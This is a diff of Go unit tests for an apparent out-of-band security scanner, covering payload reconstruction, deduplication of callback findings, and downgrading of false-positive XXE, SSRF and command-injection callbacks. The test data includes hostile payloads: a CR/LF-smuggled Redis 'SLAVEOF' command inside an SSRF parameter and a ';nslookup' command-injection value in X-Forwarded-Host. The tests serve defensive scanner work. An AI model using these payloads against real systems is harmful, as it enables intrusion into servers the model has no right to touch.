@@ -221,15 +221,41 @@ func TestPayloadRequest(t *testing.T) {
 		t.Errorf("header reconstruction missing payload: %q", hdr)
 	}
 
-	// Parameter injection is not reconstructed (the wire form is unknown) — the
-	// original request is returned unchanged.
+	// Parameter injection with NO recorded payload is not reconstructed (the wire
+	// form is unknown) — the original request is returned unchanged.
 	param := payloadRequest(raw, PayloadContext{
 		ParameterName: "url",
 		InjectionType: "parameter",
 		CallbackURL:   "abc123.oast.vigolium.com",
 	}, "http")
 	if param != string(raw) {
-		t.Errorf("parameter injection should return original request, got: %q", param)
+		t.Errorf("parameter injection without payload should return original request, got: %q", param)
+	}
+
+	// Parameter injection WITH a recorded payload → the value is re-applied at the
+	// named query parameter using the real builder, so the Request panel shows the
+	// exact wire form (the smuggle payload's literal CR/LF query-encoded, the benign
+	// crawl value replaced) instead of the untouched original request.
+	smuggleReq := []byte("GET /login?refURL=https%3A%2F%2Fvictim.example%2Fhome HTTP/1.1\r\nHost: victim.example\r\n\r\n")
+	rebuilt := payloadRequest(smuggleReq, PayloadContext{
+		ParameterName: "refURL",
+		InjectionType: "ssrf-smuggle:redis-slaveof",
+		CallbackURL:   "abc123.oast.vigolium.com",
+		Payload:       "http://abc123.oast.vigolium.com:6379/\r\nSLAVEOF vigolium.oast 0\r\n",
+	}, "dns")
+	if !strings.Contains(rebuilt, "abc123.oast.vigolium.com") {
+		t.Errorf("param reconstruction must show the callback host: %q", rebuilt)
+	}
+	if strings.Contains(rebuilt, "victim.example%2Fhome") {
+		t.Errorf("param reconstruction must replace the benign crawl value: %q", rebuilt)
+	}
+	if !strings.Contains(rebuilt, "Host: victim.example") {
+		t.Errorf("param reconstruction must preserve headers: %q", rebuilt)
+	}
+	// The literal CR/LF carried by the smuggle payload must be query-encoded, not
+	// spliced in as real bytes that would forge extra request lines/headers.
+	if strings.Contains(rebuilt, "SLAVEOF vigolium.oast 0\r\n") {
+		t.Errorf("param reconstruction must query-encode the payload's CR/LF, got raw: %q", rebuilt)
 	}
 
 	// When the planting module recorded the exact value (PayloadContext.Payload),
@@ -285,6 +311,22 @@ func TestDescribeInjectedPayload(t *testing.T) {
 	}
 	if !strings.Contains(smuggle, `\r\n`) || !strings.Contains(smuggle, "(parameter url)") {
 		t.Errorf("smuggle anchor should escape CR/LF and keep the location: %q", smuggle)
+	}
+
+	// A large recorded payload (e.g. a re-encoded SAML assertion carrying an XXE DTD)
+	// must be truncated on its one-line anchor with a byte-count suffix so it can't
+	// balloon to kilobytes; the injection location is still preserved.
+	big := describeInjectedPayload(PayloadContext{
+		ParameterName: "SAMLResponse",
+		InjectionType: "XXE (SAML external DTD)",
+		CallbackURL:   "abc123.oast.vigolium.com",
+		Payload:       strings.Repeat("QUJDRA", 2000), // ~12 KB of base64-ish text
+	}, "dns")
+	if len([]rune(big)) > maxAnchorPayloadLen+64 {
+		t.Errorf("large payload anchor should be truncated, got %d runes", len([]rune(big)))
+	}
+	if !strings.Contains(big, "bytes total)") || !strings.Contains(big, "(parameter SAMLResponse)") {
+		t.Errorf("truncated anchor should carry a byte-count suffix and the location: %q", big)
 	}
 }
 
@@ -460,6 +502,193 @@ func TestHandleInteractionCoalescesPerNonce(t *testing.T) {
 	}
 }
 
+// TestHandleInteractionCoalescesInfoPerHostInjectionPoint covers the noise the
+// investigation flagged: a crawler plants the same low-signal injection point (a
+// Referer the target logs and resolves) across dozens of URLs on one host, and
+// each DNS-only callback classifies Info/Tentative. Those must collapse to ONE
+// finding per (module, host, injection point) — not one per URL — while a distinct
+// injection point or a distinct host still keys separately.
+func TestHandleInteractionCoalescesInfoPerHostInjectionPoint(t *testing.T) {
+	repo := newOASTTestRepo(t)
+	ctx := context.Background()
+	const project = "proj-info"
+
+	var emits int
+	svc := &Service{
+		repo:        repo,
+		emitResult:  func(*output.ResultEvent) { emits++ },
+		scanUUID:    "scan-info",
+		projectUUID: project,
+	}
+
+	// Register one payload (nonce) per crawled URL, all on host dialog1.example via
+	// the same Referer injection point, then fire a DNS callback for each. A generic
+	// blind-SSRF DNS-only callback classifies Info/Tentative.
+	fire := func(nonce, targetURL, param, moduleID string) {
+		svc.trackerCache().Add(nonce, PayloadContext{
+			TargetURL:     targetURL,
+			ParameterName: param,
+			InjectionType: "parameter",
+			ModuleID:      moduleID,
+			CallbackURL:   nonce + ".oast.vigolium.com",
+		})
+		svc.handleInteraction(&server.Interaction{Protocol: "dns", UniqueID: nonce, RemoteAddress: "8.8.8.8", Timestamp: time.Unix(1, 0).UTC()})
+	}
+
+	urls := []string{
+		"https://dialog1.example/",
+		"https://dialog1.example/login",
+		"https://dialog1.example/s/",
+		"https://dialog1.example/_ui/12345",
+		"https://dialog1.example/idp/endpoint?SAMLRequest=x",
+	}
+	for i, u := range urls {
+		fire("nonceReferer"+string(rune('a'+i)), u, "Referer", "oast-probe")
+	}
+	if emits != 1 {
+		t.Fatalf("Info DNS callbacks across %d URLs (same host+param) emitted %d findings, want 1 (coalesced)", len(urls), emits)
+	}
+
+	// A different injection point on the same host is a distinct signal → new finding.
+	fire("nonceRefURL", "https://dialog1.example/dlg?refURL=y", "refURL", "oast-probe")
+	if emits != 2 {
+		t.Fatalf("distinct injection point on same host: emits=%d, want 2", emits)
+	}
+
+	// A different module on the same host+param also keys separately.
+	fire("nonceBlind", "https://dialog1.example/", "Referer", "ssrf-blind")
+	if emits != 3 {
+		t.Fatalf("distinct module on same host+param: emits=%d, want 3", emits)
+	}
+
+	// A different host, same module+param → new finding.
+	fire("nonceOtherHost", "https://other.example/", "Referer", "oast-probe")
+	if emits != 4 {
+		t.Fatalf("distinct host: emits=%d, want 4", emits)
+	}
+
+	infos, err := repo.GetFindingsBySeverity(ctx, project, "info", 50)
+	if err != nil {
+		t.Fatalf("GetFindingsBySeverity(info): %v", err)
+	}
+	if len(infos) != 4 {
+		t.Fatalf("stored %d info findings, want 4 (5 same-key URLs collapsed to 1, + 3 distinct keys)", len(infos))
+	}
+}
+
+// TestHandleInteractionXXEHarvestedCallbackDowngrade is the end-to-end reproduction
+// of the reported false positive: an XXE external-entity payload is planted, then a
+// monitoring bot fetches the injected OAST URL (the wild ginandjuice.shop callback).
+// The persisted finding must be a Low/Tentative UNCONFIRMED lead — not a High/Certain
+// "Blind XXE confirmed" — because the callback bears crawler fingerprints (a
+// self-identifying User-Agent + an h2c upgrade) an XML parser never produces.
+func TestHandleInteractionXXEHarvestedCallbackDowngrade(t *testing.T) {
+	repo := newOASTTestRepo(t)
+	ctx := context.Background()
+	const project = "proj-xxe"
+
+	var emitted *output.ResultEvent
+	svc := &Service{
+		repo:        repo,
+		emitResult:  func(r *output.ResultEvent) { emitted = r },
+		scanUUID:    "scan-xxe",
+		projectUUID: project,
+	}
+
+	const nonce = "d997mujaf7ek583c4p00f5uwnu9ajo4y6"
+	svc.trackerCache().Add(nonce, PayloadContext{
+		TargetURL:     "https://ginandjuice.shop/catalog/product/stock",
+		ParameterName: "body",
+		InjectionType: "xxe (external entity)",
+		ModuleID:      "xxe-generic",
+		CallbackURL:   nonce + ".oast.vigolium.com",
+	})
+
+	svc.handleInteraction(&server.Interaction{
+		Protocol:      "http",
+		UniqueID:      nonce,
+		RemoteAddress: "18.200.201.133",
+		RawRequest:    wildXXECallback,
+		Timestamp:     time.Unix(3, 0).UTC(),
+	})
+
+	if emitted == nil {
+		t.Fatal("expected a finding to be emitted for the correlated XXE callback")
+	}
+	if emitted.Info.Severity.String() != "low" || emitted.Info.Confidence != severity.Tentative {
+		t.Fatalf("harvested XXE callback = %s/%s, want low/tentative", emitted.Info.Severity, emitted.Info.Confidence)
+	}
+	if !strings.Contains(emitted.Info.Description, "UNCONFIRMED") {
+		t.Errorf("finding must be labelled UNCONFIRMED; desc: %s", emitted.Info.Description)
+	}
+
+	// It must not have been stored as a High "confirmed" XXE.
+	highs, err := repo.GetFindingsBySeverity(ctx, project, "high", 10)
+	if err != nil {
+		t.Fatalf("GetFindingsBySeverity(high): %v", err)
+	}
+	if len(highs) != 0 {
+		t.Fatalf("harvested XXE callback stored %d high findings, want 0", len(highs))
+	}
+	lows, err := repo.GetFindingsBySeverity(ctx, project, "low", 10)
+	if err != nil {
+		t.Fatalf("GetFindingsBySeverity(low): %v", err)
+	}
+	if len(lows) != 1 {
+		t.Fatalf("harvested XXE callback stored %d low findings, want 1", len(lows))
+	}
+}
+
+func TestOASTEmissionKey(t *testing.T) {
+	base := PayloadContext{ParameterName: "Referer", ModuleID: "oast-probe"}
+
+	// Non-Info interactions keep per-nonce identity.
+	for _, sev := range []severity.Severity{severity.High, severity.Critical, severity.Medium, severity.Low} {
+		p := base
+		p.TargetURL = "https://h.example/a"
+		if got := oastEmissionKey(sev, "nonce-1", p); got != "nonce-1" {
+			t.Errorf("oastEmissionKey(%s) = %q, want per-nonce %q", sev, got, "nonce-1")
+		}
+	}
+
+	// Info interactions coalesce across URLs on the same host+injection point.
+	a := base
+	a.TargetURL = "https://h.example/a?q=1"
+	b := base
+	b.TargetURL = "https://h.example/b"
+	ka := oastEmissionKey(severity.Info, "nonce-a", a)
+	kb := oastEmissionKey(severity.Info, "nonce-b", b)
+	if ka != kb {
+		t.Errorf("Info keys for same host+param differ: %q vs %q", ka, kb)
+	}
+	if ka == "nonce-a" {
+		t.Errorf("Info key must not be the nonce, got %q", ka)
+	}
+
+	// Distinct param, host, or module → distinct key.
+	pParam := base
+	pParam.TargetURL = "https://h.example/a"
+	pParam.ParameterName = "refURL"
+	pHost := base
+	pHost.TargetURL = "https://other.example/a"
+	pMod := base
+	pMod.TargetURL = "https://h.example/a"
+	pMod.ModuleID = "ssrf-blind"
+	for name, p := range map[string]PayloadContext{"param": pParam, "host": pHost, "module": pMod} {
+		if got := oastEmissionKey(severity.Info, "nonce-x", p); got == ka {
+			t.Errorf("distinct %s should not share key %q", name, ka)
+		}
+	}
+
+	// Header case-insensitivity: Referer and referer collapse.
+	lower := base
+	lower.TargetURL = "https://h.example/c"
+	lower.ParameterName = "referer"
+	if oastEmissionKey(severity.Info, "n", lower) != ka {
+		t.Errorf("case-different param names must coalesce")
+	}
+}
+
 func TestClassifyInteraction(t *testing.T) {
 	pctx := PayloadContext{
 		TargetURL:     "http://target.com",
@@ -532,6 +761,56 @@ func TestClassifyInteractionHostRoutingInfo(t *testing.T) {
 	}
 }
 
+// TestClassifyInteractionSmuggleDNS verifies a DNS-only SSRF protocol-smuggling
+// callback is reported as an explicitly-unconfirmed lead (DNS cannot evidence
+// cross-protocol smuggling), while the HTTP leg stays a real outbound-fetch signal.
+func TestClassifyInteractionSmuggleDNS(t *testing.T) {
+	pctx := PayloadContext{
+		TargetURL:     "https://target.com/login?refURL=x",
+		InjectionType: "ssrf-smuggle:redis-slaveof",
+		ParameterName: "refURL",
+		ModuleID:      "ssrf-protocol-smuggling",
+	}
+
+	sev, conf, desc := classifyInteraction("dns", pctx)
+	if sev != severity.Info || conf != severity.Tentative {
+		t.Fatalf("smuggle DNS want Info/Tentative, got %s/%s", sev, conf)
+	}
+	if !strings.Contains(strings.ToLower(desc), "cannot confirm cross-protocol smuggling") {
+		t.Errorf("smuggle DNS desc should explain DNS cannot confirm smuggling: %q", desc)
+	}
+
+	// The HTTP leg (an actual outbound fetch reached the collaborator) is not
+	// downgraded by the smuggle branch — it keeps the generic blind-SSRF rating.
+	if sev, _, _ := classifyInteraction("http", pctx); sev.String() != "high" {
+		t.Errorf("smuggle HTTP leg should stay high, got %s", sev)
+	}
+}
+
+// TestParamValueReflected verifies the harvested-reflected-URL signal: it fires when
+// the parameter's value is echoed in the response (encoded or decoded) and stays
+// quiet otherwise or for an unknown parameter.
+func TestParamValueReflected(t *testing.T) {
+	req := []byte("GET /login?refURL=https%3A%2F%2Fvictim.example%2Fhome HTTP/1.1\r\nHost: victim.example\r\n\r\n")
+
+	// Response echoes the URL-decoded value (the classic reflected-URL case).
+	respReflect := []byte("HTTP/1.1 200 OK\r\n\r\n<script>var u=\"https://victim.example/home\";</script>")
+	if !paramValueReflected(req, respReflect, "refURL") {
+		t.Errorf("expected reflection to be detected when the decoded value is echoed")
+	}
+
+	// No reflection → false.
+	respNo := []byte("HTTP/1.1 200 OK\r\n\r\n<html>nothing echoed here</html>")
+	if paramValueReflected(req, respNo, "refURL") {
+		t.Errorf("did not expect reflection when the value is absent")
+	}
+
+	// Unknown parameter name → false (no insertion point matches).
+	if paramValueReflected(req, respReflect, "nope") {
+		t.Errorf("unknown parameter must not report reflection")
+	}
+}
+
 // TestClassifyCommandInjectionForwardingHeaderFP locks in the false-positive
 // defense for OAST command injection: a DNS-only callback for a payload injected
 // into a client-IP / forwarding header is NOT confirmed command injection (edge
@@ -593,12 +872,12 @@ func TestClassifyCommandInjectionProtocolMismatch(t *testing.T) {
 	const host = "d8vktfraf7em8h1864k0bigm5o33zt98m.oast.vigolium.com"
 	// The wild payload, verbatim: base host + ";nslookup <oast>" in X-Forwarded-Host.
 	xfh := PayloadContext{
-		TargetURL:     "https://lk-customerops-dr.sc-corp.net/",
+		TargetURL:     "https://lk-customerops-dr.hooli-corp.net/",
 		ParameterName: "X-Forwarded-Host",
 		InjectionType: "os-command-injection (header)",
 		ModuleID:      "command-injection-oast",
 		CallbackURL:   host,
-		Payload:       "lk-customerops-dr.sc-corp.net;nslookup " + host,
+		Payload:       "lk-customerops-dr.hooli-corp.net;nslookup " + host,
 	}
 	for _, proto := range []string{"http", "https", "HTTPS"} {
 		sev, conf, desc := classifyInteraction(proto, xfh)
@@ -670,6 +949,191 @@ func TestClassifyCommandInjectionReflectedHostHeader(t *testing.T) {
 		if sev, conf, _ := classifyInteraction("dns", nsl); sev.String() != "low" || conf != severity.Tentative {
 			t.Errorf("nslookup payload + DNS on %q = %s/%s, want low/tentative", name, sev, conf)
 		}
+	}
+}
+
+// wildXXECallback is the exact out-of-band callback that triggered the reported
+// false positive: ginandjuice.shop's own monitoring bot fetched the injected OAST
+// URL with a self-identifying User-Agent and an HTTP/2 cleartext upgrade — nothing
+// to do with an XML parser dereferencing an external entity.
+const wildXXECallback = "GET / HTTP/1.1\r\n" +
+	"Host: d997mujaf7ek583c4p00f5uwnu9ajo4y6.oast.vigolium.com\r\n" +
+	"Connection: Upgrade, HTTP2-Settings\r\n" +
+	"Http2-Settings: AAEAAEAAAAIAAAABAAMAAABkAAQBAAAAAAUAAEAA\r\n" +
+	"Upgrade: h2c\r\n" +
+	"User-Agent: ginandjuice.shop; support@portswigger.net\r\n" +
+	"X-Forwarded-For: 10.0.3.83\r\n\r\n"
+
+// TestLooksLikeHarvestedURLFetch locks in the callback-source fingerprinting that
+// separates a genuine server-side XML-parser entity fetch from a crawler / URL-
+// preview bot / monitor that harvested the injected OAST URL and visited it.
+func TestLooksLikeHarvestedURLFetch(t *testing.T) {
+	target := "https://ginandjuice.shop/catalog/product/stock"
+	tests := []struct {
+		name    string
+		raw     string
+		target  string
+		harvest bool
+	}{
+		{"reported wild FP (email UA + h2c)", wildXXECallback, target, true},
+		{"browser User-Agent", "GET / HTTP/1.1\r\nHost: n.oast\r\nUser-Agent: Mozilla/5.0 (X11) AppleWebKit/537.36 Chrome/149 Safari/537.36\r\n\r\n", target, true},
+		{"self-identifying bot", "GET / HTTP/1.1\r\nHost: n.oast\r\nUser-Agent: Slackbot-LinkExpanding 1.0\r\n\r\n", target, true},
+		{"link-preview crawler", "GET / HTTP/1.1\r\nHost: n.oast\r\nUser-Agent: facebookexternalhit/1.1\r\n\r\n", target, true},
+		{"contact address in UA", "GET / HTTP/1.1\r\nHost: n.oast\r\nUser-Agent: SomeScanner (+admin@evil-monitor.io)\r\n\r\n", target, true},
+		{"UA names the target host", "GET / HTTP/1.1\r\nHost: n.oast\r\nUser-Agent: ginandjuice.shop\r\n\r\n", target, true},
+		{"h2c upgrade only", "GET / HTTP/1.1\r\nHost: n.oast\r\nUpgrade: h2c\r\n\r\n", target, true},
+		{"two browser-only headers", "GET / HTTP/1.1\r\nHost: n.oast\r\nAccept-Language: en-US\r\nSec-Fetch-Mode: navigate\r\n\r\n", target, true},
+
+		// Genuine XML-parser entity fetches — must NOT be flagged.
+		{"bare libxml2 fetch (no UA)", "GET /d.dtd HTTP/1.0\r\nHost: n.oast\r\n\r\n", target, false},
+		{"Java URL fetch", "GET / HTTP/1.1\r\nHost: n.oast\r\nUser-Agent: Java/1.8.0_292\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", target, false},
+		{"Python-urllib fetch", "GET / HTTP/1.1\r\nHost: n.oast\r\nUser-Agent: Python-urllib/3.9\r\n\r\n", target, false},
+		{"curl fetch (ambiguous, not flagged)", "GET / HTTP/1.1\r\nHost: n.oast\r\nUser-Agent: curl/7.68.0\r\n\r\n", target, false},
+		{"single benign header", "GET / HTTP/1.1\r\nHost: n.oast\r\nAccept-Language: en-US\r\n\r\n", target, false},
+		{"empty request (DNS/fixed-URL)", "", target, false},
+	}
+	for _, tt := range tests {
+		got, reason := looksLikeHarvestedURLFetch(tt.raw, tt.target)
+		if got != tt.harvest {
+			t.Errorf("%s: looksLikeHarvestedURLFetch = %v (reason %q), want %v", tt.name, got, reason, tt.harvest)
+		}
+		if got && reason == "" {
+			t.Errorf("%s: harvested callback must carry a reason", tt.name)
+		}
+	}
+}
+
+// TestRefineOASTCallbackXXE locks in the second-signal confirmation for XXE: an
+// XXE OAST HTTP callback that looks like a harvested-URL fetch is downgraded to
+// Low/Tentative UNCONFIRMED, while a bare parser-consistent fetch stays High/Certain
+// and DNS interactions are untouched.
+func TestRefineOASTCallbackXXE(t *testing.T) {
+	xxe := PayloadContext{
+		TargetURL:     "https://ginandjuice.shop/catalog/product/stock",
+		ParameterName: "body",
+		InjectionType: "xxe (external entity)",
+		ModuleID:      "xxe-generic",
+	}
+
+	// The reported wild FP: HTTP callback from a monitoring bot → downgraded.
+	inter := &server.Interaction{Protocol: "http", RawRequest: wildXXECallback}
+	sev, conf, desc := refineOASTCallback(inter, xxe, severity.High, severity.Certain, "Blind XXE confirmed")
+	if sev.String() != "low" || conf != severity.Tentative {
+		t.Fatalf("harvested XXE HTTP callback = %s/%s, want low/tentative", sev, conf)
+	}
+	if !strings.Contains(desc, "UNCONFIRMED") || !strings.Contains(desc, "XXE") {
+		t.Errorf("downgraded XXE finding must be labelled UNCONFIRMED XXE; desc: %s", desc)
+	}
+
+	// A bare, parser-consistent HTTP fetch on the same injection → stays High/Certain.
+	parser := &server.Interaction{Protocol: "http", RawRequest: "GET /d.dtd HTTP/1.0\r\nHost: n.oast.vigolium.com\r\n\r\n"}
+	if sev, conf, _ := refineOASTCallback(parser, xxe, severity.High, severity.Certain, "Blind XXE confirmed"); sev.String() != "high" || conf != severity.Certain {
+		t.Errorf("bare parser XXE fetch = %s/%s, want high/certain (untouched)", sev, conf)
+	}
+
+	// DNS callbacks carry no request to fingerprint → left as classifyXXE rated them.
+	dns := &server.Interaction{Protocol: "dns", RawRequest: ""}
+	if sev, conf, _ := refineOASTCallback(dns, xxe, severity.High, severity.Firm, "Blind XXE likely"); sev.String() != "high" || conf != severity.Firm {
+		t.Errorf("XXE DNS callback = %s/%s, want high/firm (untouched)", sev, conf)
+	}
+}
+
+// TestRefineOASTCallbackSiblingClasses verifies the harvested-URL guard now covers
+// the other out-of-band classes whose real fetcher is a specific non-browser client
+// — JWT jku/x5u (JWKS fetcher), out-of-band SQLi (database engine), and command
+// injection (curl/wget) — while leaving fetcher-consistent callbacks alone.
+func TestRefineOASTCallbackSiblingClasses(t *testing.T) {
+	harvested := &server.Interaction{Protocol: "https", RawRequest: wildXXECallback}
+
+	cases := []struct {
+		name    string
+		inj     string
+		wantLbl string
+	}{
+		{"jwt jku/x5u", "jwt-header-key-url-injection (header)", "JWT"},
+		{"oob sqli", "sql-injection (out-of-band)", "SQL injection"},
+		{"command injection", "os-command-injection (parameter)", "OS command injection"},
+		{"saml xxe", "XXE (SAML external DTD)", "XXE"},
+	}
+	for _, tc := range cases {
+		pctx := PayloadContext{TargetURL: "https://api.acme.test/x", InjectionType: tc.inj}
+		sev, conf, desc := refineOASTCallback(harvested, pctx, severity.High, severity.Certain, "confirmed")
+		if sev.String() != "low" || conf != severity.Tentative {
+			t.Errorf("%s harvested callback = %s/%s, want low/tentative", tc.name, sev, conf)
+		}
+		if !strings.Contains(desc, "UNCONFIRMED") || !strings.Contains(desc, tc.wantLbl) {
+			t.Errorf("%s: desc must be UNCONFIRMED %q; got %s", tc.name, tc.wantLbl, desc)
+		}
+	}
+
+	// A fetcher-consistent callback (curl UA for command injection; a JWKS library
+	// GET for JWT) must NOT be downgraded.
+	curl := &server.Interaction{Protocol: "http", RawRequest: "GET / HTTP/1.1\r\nHost: n.oast\r\nUser-Agent: curl/7.68.0\r\n\r\n"}
+	cmdi := PayloadContext{TargetURL: "http://t/run", InjectionType: "os-command-injection (parameter)"}
+	if sev, conf, _ := refineOASTCallback(curl, cmdi, severity.Critical, severity.Certain, "confirmed"); sev.String() != "critical" || conf != severity.Certain {
+		t.Errorf("curl-UA cmdi callback = %s/%s, want critical/certain (untouched)", sev, conf)
+	}
+}
+
+// TestRefineOASTCallbackSSRFNarrow verifies generic blind SSRF uses only the narrow
+// external-monitor signal: a self-identifying monitor (contact email / target-host
+// UA) downgrades to Info/Tentative, but a plain browser UA or h2c handshake does NOT
+// (it could be a genuine headless-browser / link-preview-service SSRF).
+func TestRefineOASTCallbackSSRFNarrow(t *testing.T) {
+	ssrf := PayloadContext{TargetURL: "https://ginandjuice.shop/p", ParameterName: "url", InjectionType: "parameter", ModuleID: "ssrf-blind"}
+
+	// External monitor (the wild UA: contact email + names the target host) → Info.
+	monitor := &server.Interaction{Protocol: "http", RawRequest: wildXXECallback}
+	if sev, conf, desc := refineOASTCallback(monitor, ssrf, severity.High, severity.Certain, "Blind SSRF confirmed"); sev.String() != "info" || conf != severity.Tentative {
+		t.Errorf("external-monitor SSRF callback = %s/%s, want info/tentative; desc: %s", sev, conf, desc)
+	}
+
+	// A plain browser / h2c callback must stay High — it may be a real headless-
+	// browser or link-preview-service SSRF, which the narrow check must not suppress.
+	browser := &server.Interaction{Protocol: "http", RawRequest: "GET / HTTP/1.1\r\nHost: n.oast\r\nUpgrade: h2c\r\nUser-Agent: Mozilla/5.0 Chrome/149 Safari/537.36\r\n\r\n"}
+	if sev, conf, _ := refineOASTCallback(browser, ssrf, severity.High, severity.Certain, "Blind SSRF confirmed"); sev.String() != "high" || conf != severity.Certain {
+		t.Errorf("browser/h2c SSRF callback = %s/%s, want high/certain (genuine headless-browser SSRF preserved)", sev, conf)
+	}
+
+	// An already-Info host-routing SSRF is left untouched (nothing to downgrade to).
+	routing := PayloadContext{TargetURL: ssrf.TargetURL, ParameterName: "request-line", InjectionType: "routing-ssrf (request-line)", ModuleID: "routing-ssrf"}
+	if sev, _, _ := refineOASTCallback(monitor, routing, severity.Info, severity.Certain, "informational"); sev.String() != "info" {
+		t.Errorf("already-Info routing SSRF = %s, want info (untouched)", sev)
+	}
+}
+
+// TestLooksLikeExternalMonitor pins the narrow SSRF check: only a contact-address UA
+// or a UA naming the target host fires; plain browser/bot/h2c signals do not.
+func TestLooksLikeExternalMonitor(t *testing.T) {
+	target := "https://ginandjuice.shop/p"
+	tests := []struct {
+		raw  string
+		want bool
+	}{
+		{wildXXECallback, true}, // contact email + names target host
+		{"GET / HTTP/1.1\r\nHost: n\r\nUser-Agent: UptimeRobot (+admin@monitor.io)\r\n\r\n", true},
+		{"GET / HTTP/1.1\r\nHost: n\r\nUser-Agent: ginandjuice.shop-monitor\r\n\r\n", true},
+		{"GET / HTTP/1.1\r\nHost: n\r\nUser-Agent: Mozilla/5.0 Chrome/149\r\n\r\n", false}, // headless-browser SSRF stays
+		{"GET / HTTP/1.1\r\nHost: n\r\nUpgrade: h2c\r\n\r\n", false},                       // h2c alone must not fire
+		{"", false},
+	}
+	for i, tt := range tests {
+		if got, _ := looksLikeExternalMonitor(tt.raw, target); got != tt.want {
+			t.Errorf("case %d: looksLikeExternalMonitor = %v, want %v", i, got, tt.want)
+		}
+	}
+}
+
+// TestClassifyXXEDNSConfidence pins the DNS-only XXE leg at High/Firm (not
+// Certain): a bare DNS resolution of the per-payload subdomain carries no request
+// to attribute to the XML parser, so it is one notch below the HTTP-fetch leg —
+// mirroring the SQLi/JWT out-of-band DNS legs.
+func TestClassifyXXEDNSConfidence(t *testing.T) {
+	if sev, conf, _ := classifyXXE("dns", "xxe (external entity) via parameter body"); sev.String() != "high" || conf != severity.Firm {
+		t.Errorf("classifyXXE(dns) = %s/%s, want high/firm", sev, conf)
+	}
+	if sev, conf, _ := classifyXXE("http", "xxe (external entity) via parameter body"); sev.String() != "high" || conf != severity.Certain {
+		t.Errorf("classifyXXE(http) = %s/%s, want high/certain", sev, conf)
 	}
 }
 
